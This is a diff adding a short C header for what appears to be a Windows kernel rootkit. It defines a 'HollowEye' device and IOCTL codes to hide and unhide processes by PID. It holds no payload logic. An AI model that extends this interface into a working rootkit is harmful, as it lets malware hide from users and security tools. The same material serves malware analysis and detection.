@@ -1,0 +1,15 @@
+#ifndef _SHARED_H_
+#define _SHARED_H_
+
+#define RK_DEVICE_NAME      L"\\\\.\\HollowEye"
+
+#define RK_DEVICE_TYPE      FILE_DEVICE_UNKNOWN
+
+#define RK_CTL_HIDE         CTL_CODE(RK_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define RK_CTL_UNHIDE       CTL_CODE(RK_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+typedef struct _RK_HIDE_INPUT {
+    ULONG Pid;
+} RK_HIDE_INPUT, *PRK_HIDE_INPUT;
+
+#endif
